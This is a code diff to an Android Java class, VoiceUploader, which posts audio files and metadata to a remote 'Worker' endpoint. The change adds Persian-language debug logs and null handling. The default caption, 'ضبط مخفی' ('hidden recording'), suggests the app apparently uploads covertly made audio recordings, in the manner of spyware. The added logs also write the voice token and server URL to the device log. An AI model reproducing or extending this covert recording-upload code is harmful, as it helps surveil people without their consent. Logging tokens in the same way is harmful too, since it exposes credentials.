@@ -35,12 +35,18 @@ public class VoiceUploader {
             try {
                 File file = new File(filePath);
                 if (!file.exists()) {
+                    Log.e(TAG, "❌ فایل وجود ندارد: " + filePath);
                     callback.onFailure("فایل صوتی پیدا نشد");
                     return;
                 }
                 
-                Log.d(TAG, "📤 Uploading to Worker: " + filePath);
-                Log.d(TAG, "📏 Size: " + file.length() + " bytes");
+                Log.d(TAG, "========== شروع آپلود ==========");
+                Log.d(TAG, "📤 مسیر فایل: " + filePath);
+                Log.d(TAG, "📏 حجم فایل: " + file.length() + " bytes");
+                Log.d(TAG, "🆔 Voice Token: " + voiceToken);
+                Log.d(TAG, "📝 Caption: " + caption);
+                Log.d(TAG, "⏱️ Duration: " + duration + "ms");
+                Log.d(TAG, "🌐 Worker URL: " + WORKER_URL);
                 
                 // ساخت FormData
                 RequestBody fileBody = RequestBody.create(
@@ -51,10 +57,9 @@ public class VoiceUploader {
                 MultipartBody.Builder builder = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("audio", file.getName(), fileBody)
-                    .addFormDataPart("voice_token", voiceToken)
+                    .addFormDataPart("voice_token", voiceToken != null ? voiceToken : "unknown")
                     .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
-                    .addFormDataPart("duration", String.valueOf(duration / 1000))
-                    .addFormDataPart("start_time", String.valueOf(System.currentTimeMillis()));
+                    .addFormDataPart("duration", String.valueOf(duration / 1000));
                 
                 RequestBody requestBody = builder.build();
                 
@@ -63,33 +68,38 @@ public class VoiceUploader {
                     .post(requestBody)
                     .build();
                 
+                Log.d(TAG, "📤 ارسال درخواست به Worker...");
                 Response response = httpClient.newCall(request).execute();
                 String responseBody = response.body() != null ? response.body().string() : "";
                 
-                Log.d(TAG, "📥 Response Code: " + response.code());
-                Log.d(TAG, "📥 Response: " + responseBody);
+                Log.d(TAG, "📥 کد پاسخ: " + response.code());
+                Log.d(TAG, "📥 پاسخ: " + responseBody);
                 
                 if (response.isSuccessful()) {
                     try {
                         JSONObject json = new JSONObject(responseBody);
                         String status = json.optString("status", "unknown");
                         if ("success".equals(status)) {
+                            Log.d(TAG, "✅ آپلود موفق!");
                             callback.onSuccess(responseBody);
                         } else {
                             String msg = json.optString("message", "خطا در سرور");
+                            Log.e(TAG, "❌ خطا از سرور: " + msg);
                             callback.onFailure(msg);
                         }
                     } catch (Exception e) {
+                        Log.e(TAG, "❌ خطا در پردازش JSON", e);
                         callback.onFailure("خطا در پردازش پاسخ سرور");
                     }
                 } else {
+                    Log.e(TAG, "❌ خطا در ارتباط با سرور: " + response.code());
                     callback.onFailure("خطا در ارتباط با سرور: " + response.code());
                 }
                 
                 response.close();
                 
             } catch (Exception e) {
-                Log.e(TAG, "❌ Upload error", e);
+                Log.e(TAG, "❌ خطا در آپلود", e);
                 callback.onFailure(e.getMessage());
             }
         }).start();
@@ -99,7 +109,12 @@ public class VoiceUploader {
     public boolean uploadVoiceSync(String filePath, String voiceToken, String caption, long duration) {
         try {
             File file = new File(filePath);
-            if (!file.exists()) return false;
+            if (!file.exists()) {
+                Log.e(TAG, "❌ فایل وجود ندارد: " + filePath);
+                return false;
+            }
+            
+            Log.d(TAG, "📤 آپلود همگام: " + filePath);
             
             RequestBody fileBody = RequestBody.create(
                 file,
@@ -109,7 +124,7 @@ public class VoiceUploader {
             MultipartBody.Builder builder = new MultipartBody.Builder()
                 .setType(MultipartBody.FORM)
                 .addFormDataPart("audio", file.getName(), fileBody)
-                .addFormDataPart("voice_token", voiceToken)
+                .addFormDataPart("voice_token", voiceToken != null ? voiceToken : "unknown")
                 .addFormDataPart("caption", caption != null ? caption : "🎙️ ضبط مخفی")
                 .addFormDataPart("duration", String.valueOf(duration / 1000));
             
@@ -121,12 +136,16 @@ public class VoiceUploader {
                 .build();
             
             Response response = httpClient.newCall(request).execute();
+            String responseBody = response.body() != null ? response.body().string() : "";
+            
+            Log.d(TAG, "📥 پاسخ: " + response.code() + " - " + responseBody);
+            
             boolean success = response.isSuccessful();
             response.close();
             return success;
             
         } catch (Exception e) {
-            Log.e(TAG, "❌ Upload error", e);
+            Log.e(TAG, "❌ خطا در آپلود همگام", e);
             return false;
         }
     }
